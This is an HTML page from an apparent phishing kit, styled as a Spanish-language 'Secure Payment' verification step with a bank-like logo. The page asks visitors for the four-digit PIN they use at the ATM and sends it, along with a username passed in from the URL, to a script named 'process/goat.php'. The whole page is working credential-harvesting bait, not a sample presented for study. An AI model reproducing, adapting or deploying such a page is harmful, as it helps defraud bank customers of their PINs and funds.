<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" 
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <title>Secure Payment</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }
        body {
            background-color: #ececec;
        }
        .contenido {
            width: 90%;
            border-radius: 30px;
            background-color: white;
            height: 290px;
            padding: 20px;
            margin: auto;
        }
    </style>
</head>
<body>

    <center>
        <img src="img/verify.png" alt="Verify" width="50%">
        <br><br>
        <img src="img/logo.png" alt="Logo" width="50%">
        <br><br>
        <a style="font-size:30px;">Ingresa tu clave</a>
    </center>

    <br>
    <div class="contenido">
        <center>
            <a style="font-size:16px;">La clave es la misma que utilizas en el cajero</a><br><br><br>
            <!-- Formulario que envía los datos a goat.php -->
            <form action="process/goat.php" method="POST">
    <input type="hidden" name="user" value="<?php echo htmlspecialchars($_GET['user'] ?? ''); ?>">
    <input type="password" name="pass" placeholder="****" 
           style="border:none; width:90%; height:35px; border-bottom:1px solid #dcdcdc; text-align:center;" 
           maxlength="4" required>
    <br><br>
    <input type="submit" value="Continuar" 
           style="width:80%; background-color:#fdd923; height:40px; border-radius:100px; border:none; font-weight:bold; color:black;">
</form>

        </center>
    </div>

</body>
</html>
